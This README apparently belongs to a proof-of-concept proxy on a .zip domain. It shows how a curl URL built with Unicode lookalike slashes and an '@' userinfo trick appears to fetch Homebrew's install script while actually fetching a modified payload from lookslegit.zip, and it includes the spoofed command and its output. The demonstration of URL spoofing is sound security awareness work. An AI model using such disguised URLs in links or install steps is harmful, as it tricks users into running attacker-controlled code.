# ✨ `lookslegit.zip`

Jumping on the `.zip` tld hype train, & because we can use unicode characters in URLs now, we can make a nice web proxy that proxies http requests through a trick with Basic Auth and modify the payload of a seemingly safe looking URL. 

After you curl, notice the headers in the `curl` response to include the following:

```
❯ curl -v https:⧸⧸raw.githubusercontent.com⧸Homebrew⧸install⧸HEAD⧸install.sh@lookslegit.zip | head
...
* Server auth using Basic with user 'https'
> GET / HTTP/1.1
> Host: lookslegit.zip
> Authorization: Basic aHR0cHM64qe44qe4cmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbeKnuEhvbWVicmV34qe4aW5zdGFsbOKnuEhFQUTip7hpbnN0YWxsLnNo
< HTTP/1.1 200 OK
...
< warning: This response was modified, and the results should not be trusted. Like at all.
...
<
* Connection #0 to host lookslegit.zip left intact
lol owned
...
```

## Usage

```bash
# Replace / with ⧸ character 
curl -v https:⧸⧸raw.githubusercontent.com⧸Homebrew⧸install⧸HEAD⧸install.sh@lookslegit.zip
```

## Build

```bash
npm run build && node dist/server.js
```